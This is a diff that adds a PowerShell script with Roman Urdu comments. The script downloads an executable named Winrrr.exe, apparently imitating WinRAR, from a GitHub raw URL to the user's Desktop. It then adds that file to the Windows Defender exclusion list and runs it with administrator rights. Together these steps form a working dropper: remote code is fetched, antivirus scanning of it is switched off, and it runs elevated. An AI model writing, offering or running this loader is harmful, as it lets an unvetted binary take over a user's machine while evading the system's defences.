@@ -1,0 +1,45 @@
+# 1. Desktop path set karein
+$desktopPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("Desktop"), "Winrrr.exe")
+
+# 2. GitHub Raw Application Download URL
+$url = "https://github.com/afnan-altaf/winrrr/raw/refs/heads/main/Winrrr.exe"
+
+try {
+    Write-Host "[INFO] File download ho rahi hai..." -ForegroundColor Cyan
+    
+    # Secure connection protocol force karna
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    
+    # File download karna
+    Invoke-WebRequest -Uri $url -OutFile $desktopPath -UseBasicParsing
+    
+    # 3. Validation: Check karein ke download hone wali file proper EXE hai ya nahi
+    $fileContent = Get-Content -Path $desktopPath -TotalCount 1 -Encoding Ascii
+    if ($fileContent -notmatch "^MZ") {
+        throw "Downloaded file valid Windows application (.EXE) nahi hai! URL ghalat hai ya repository private hai."
+    }
+    
+    Write-Host "[SUCCESS] Valid Executable File Desktop par download ho gayi hai." -ForegroundColor Green
+
+    # 4. Windows Defender Exclusion List setup
+    Write-Host "[INFO] Windows Defender mein exclusion add ho raha hai..." -ForegroundColor Cyan
+    Add-MpPreference -ExclusionPath $desktopPath
+    
+    # 5. Application ko Run as Administrator karwana (Windows PowerShell version)
+    Write-Host "[INFO] Application chalayi ja rahi hai..." -ForegroundColor Cyan
+    
+    # Standard Windows environment execution method
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = $desktopPath
+    $psi.Verb = "runas"
+    $psi.UseShellExecute = $true
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    
+    Write-Host "[SUCCESS] Process mukammal ho gaya!" -ForegroundColor Green
+}
+catch {
+    Write-Host "[ERROR] Kuch masla aya hai: $_" -ForegroundColor Red
+    
+    # Corrupted file ko delete karna
+    if (Test-Path $desktopPath) { Remove-Item $desktopPath -Force }
+}
